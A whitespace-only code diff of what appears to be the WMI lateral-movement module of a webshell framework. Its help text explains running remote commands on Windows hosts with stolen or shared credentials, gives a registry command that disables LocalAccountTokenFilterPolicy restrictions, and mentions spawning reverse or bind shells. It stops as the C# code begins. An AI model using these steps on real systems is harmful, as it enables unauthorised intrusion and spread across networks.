@@ -13,46 +13,46 @@ class Lateral_wmi(Module):
     complete_help = r"""
         This module run a wmic /node:[ip] command in order to launch commands on a remote windows system.
         This will result in a lateral movement if shared credentials are known.
-        
+
         Note that if you use local admin credentials you should ensure that, on the target server, the feature
         "LocalAccountTokenFilterPolicy" is disabled. (except for builtin Administrator)
         To disable that you need to add the following regkey with the value of 1:
-        
+
         HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy
-        
+
         example command:
             reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-        
+
         If you use domain users for the lateral movement, no restrictions to the process token will be applied.
         Remember to always specify the domain in the username field. If you use a local account use the machine name as the domain.
-        
+
         This module uses WMI builtin features wmi and doesn't need additional files to be droppend on the target
         server.
-        
+
         Note that, wmi commands don't return stdout/stderr output from the execution of remote processes.
         You should redirect output to a shared resource (i.e. local share with everyone permission) or just spawn
-        reverse/bind shell. 
-                       
+        reverse/bind shell.
+
         Usage:
             #lateral_wmi target_ip username password command [local_user] [local_password] [local_domain]
-        
+
         Positional arguments:
             target_ip               the ip of the remote server
-            username                username of the user to use to login on the target server 
+            username                username of the user to use to login on the target server
                                     you can specify domain\username if user is in a domain
             password                password of the user to use to login on the target server
             command                 a command compatible by cmd.exe
-                                        
+
         Examples:
             Lateral movement as privileged current application pool user, output to local shared resource:
-                 #lateral_wmi 192.168.56.102 'domain\remote_user1' 'remote_password1' 'whoami /all > C:\Windows\Temp\whoami.txt' 
-          
+                 #lateral_wmi 192.168.56.102 'domain\remote_user1' 'remote_password1' 'whoami /all > C:\Windows\Temp\whoami.txt'
+
     """
 
     _runtime_code = r"""
                     using System;using System.IO;using System.Diagnostics;using System.Text;
                     public class SharPyShell
-                    {                    
+                    {
                         string LateralWMI(string arg, string working_path)
                         {
                             ProcessStartInfo pinfo = new ProcessStartInfo();
